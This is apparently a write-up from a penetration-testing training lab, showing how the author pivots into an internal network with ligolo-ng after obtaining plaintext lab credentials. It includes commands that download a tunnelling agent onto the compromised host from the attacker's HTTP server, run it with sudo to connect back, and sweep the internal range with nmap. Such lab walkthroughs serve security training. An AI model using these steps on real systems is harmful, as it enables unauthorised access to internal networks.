By this point of the engagement we know there is a possible point of access into an internal network. Our external engagement left us with a set of credentials and a internal facing interface.

A set of credentials in plain text.
```
http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7
```
Some important information we get from our linpeas scan not involving vulnerabilities.
```
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.80.10  netmask 255.255.255.0  broadcast 192.168.80.255
        ether 00:50:56:96:17:f9  txqueuelen 1000  (Ethernet)
        RX packets 152365  bytes 176914936 (176.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 125048  bytes 19022214 (19.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:0c:29:28:1b:7e  txqueuelen 1000  (Ethernet)
        RX packets 8924  bytes 2918390 (2.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10163  bytes 2226934 (2.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13972  bytes 4745588 (4.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13972  bytes 4745588 (4.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

# Configuring Ligolo

On our attacking host we will be downloading ligolo, both the agent and the proxy
```
#Proxy  
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz


#Agent  
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
## Setting up proxy in attacking machine
After installing this so:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip tuntap add user notconcerned mode tun ligolo
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $ip route
default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
192.168.80.0/24 via 10.10.200.1 dev tun0 
192.168.98.0/24 via 10.10.200.1 dev tun0 
192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
```

We can then delete our current tun0 interface torwards the internal ip range:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip route del 192.168.98.0/24 dev tun0
```
Set up a link with our new ligolo interface
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip link set ligolo up
```

And re-add the 192.168.98.0/24 internal IP range to our new ligolo interface:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip route add 192.168.98.0/24 dev ligolo
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $ip route
default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
192.168.80.0/24 via 10.10.200.1 dev tun0 
192.168.98.0/24 dev ligolo scope link linkdown 
192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
```

We can then start the ligolo proxy server on the Attacking machine
```bash
┌─[✗]─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $sudo ./proxy -selfcert -laddr 0.0.0.0:443  
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng »  

```

## Setting up agent in victim machine (privilege@192.168.80.10)
Transfer the agent to the victim machine & start the connection

Set up a python server on attacking machine
```bash
python -m http.server 8000
```

Curl the agent from the victim machine
```bash
privilege@ubuntu-virtual-machine:~$ curl http://10.10.200.206:8000/agent -o agent
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 4396k  100 4396k    0     0   255k      0  0:00:17  0:00:17 --:--:--  291k

```


Run the agent. Replace this with your attacker IP address.  
```bash
privilege@ubuntu-virtual-machine:~$ sudo ./agent -connect 10.10.200.206:443 -ignore-cert 
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.200.206:443" 
```

Our serverside attacking machine shows the connection:
```bash
igolo-ng » INFO[0632] Agent joined.                                 name=root@ubuntu-virtual-machine remote="192.168.80.10:36306"
ligolo-ng » session
? Specify a session :  [Use arrows to move, type to filter]
> 1 - root@ubuntu-virtual-machine - 192.168.80.10:36306

```

With this setup done, we can start up a tunnal and reach our new internal host from our attacking machine:
```bash
[Agent : root@ubuntu-virtual-machine] » start
[Agent : root@ubuntu-virtual-machine] » INFO[1188] Starting tunnel to root@ubuntu-virtual-machine 
```

# Enumeration
We will start with a basic enumeration through our internal range

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $nmap -sn 192.168.98.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 20:14 EST
Nmap scan report for 192.168.98.2
Host is up (0.61s latency).
Nmap scan report for 192.168.98.15
Host is up (0.19s latency).
Nmap scan report for 192.168.98.30
Host is up (0.22s latency).
Nmap scan report for 192.168.98.120
Host is up (0.36s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 27.04 seconds
```